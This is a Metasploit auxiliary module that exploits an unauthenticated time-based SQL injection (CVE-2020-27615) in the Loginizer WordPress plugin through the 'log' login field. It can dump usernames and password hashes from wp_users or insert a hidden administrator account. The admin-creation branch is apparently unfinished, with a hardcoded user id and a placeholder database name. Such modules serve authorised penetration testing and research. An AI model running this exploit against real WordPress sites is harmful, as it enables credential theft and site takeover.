##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Loginizer log SQLi Scanner',
        'Description' => %q{
          Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in
          versions before 1.6.4.  The vulnerable parameter is in the log parameter.
          Wordpress has forced updates of the plugin to all servers
        },
        'Author' =>
          [
            'h00die', # msf module
            'red0xff', # sqli help
            'mslavco' # discovery
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['URL', 'https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/'],
            ['CVE', '2020-27615'],
            ['URL', 'https://loginizer.com/blog/loginizer-1-6-4-security-fix/'],
            ['URL', 'https://twitter.com/mslavco/status/1318877097184604161']
          ],
        'Actions' => [
          ['List Users', 'Description' => 'Queries username, password hash for COUNT users'],
          ['Create Admin', 'Description' => 'Adds a new admin user'],
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2020-10-21'
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])
    ]
  end

  def run_host(_ip)
    unless wordpress_and_online?
      vprint_error('Server not online or not detected as wordpress')
      return
    end

    checkcode = check_plugin_version_from_readme('loginizer', '1.6.4')
    if checkcode == Msf::Exploit::CheckCode::Safe
      vprint_error('Loginizer version not vulnerable')
      return
    else
      print_good('Vulnerable version detected')
    end

    cookie = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'wp-login.php') }).get_cookies
    # text = Rex::Text::rand_text_alpha(3,5)
    password = Rex::Text.rand_text_alpha(10)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      if payload.include?('<')
        payload.gsub!(/<>/, '=')
        payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) { '0,' + Regexp.last_match(1) }
      end
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
        'cookie' => cookie,
        'vars_post' => {
          'log' => "',ip=LEFT(UUID(),8),url=#{payload}#",
          # 'log'=> "', ip = LEFT(UUID(), 8), url = ( TRUE AND #{payload}) -- #{text}",
          'pwd' => password,
          'wp-submit' => 'Login',
          'redirect_to' => '',
          'testcookie' => '1'
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end
    unless @sqli.test_vulnerable
      fail_with("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
    end
    if action.name == 'List Users'
      # https://www.redbridgenet.com/mysql-to-find-select-wordpress-users-with-administrator-capabilities/
      columns = ['user_login', 'user_pass']
      results = @sqli.dump_table_fields('wp_users', columns, condition = '', num_limit = datastore['COUNT'])
      table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
      results.each do |user|
        table << user
      end
      print_good(table.to_s)
    elsif action.name == 'Create Admin'
      # https://www.wpbeginner.com/wp-tutorials/how-to-add-an-admin-user-to-the-wordpress-database-via-mysql/
      print_status('Adding User')
      # XXX remove 4
      username = Rex::Text.rand_text_alphanumeric(10)
      password = Rex::Text.rand_text_alphanumeric(20)
      email = "#{Rex::Text.rand_text_alphanumeric(5)}@#{Rex::Text.rand_text_alpha}.com"
      print_status("Attempting to create #{username}:#{password} with email #{email}")
      @sqli.run_sql("INSERT INTO 'wp_users' ('user_login', 'user_pass', 'user_nicename', 'user_email') VALUES (#{username}, MD5(#{password}), #{username}, #{email})")
      print_status('Adding to group')
      @sqli.run_sql("INSERT INTO 'databasename'.'wp_usermeta' ('umeta_id', 'user_id', 'meta_key', 'meta_value') VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');")
      print_status('Setting user level')
      @sqli.run_sql("INSERT INTO 'databasename'.'wp_usermeta' ('umeta_id', 'user_id', 'meta_key', 'meta_value') VALUES (NULL, '4', 'wp_user_level', '10');")
    end
  end
end
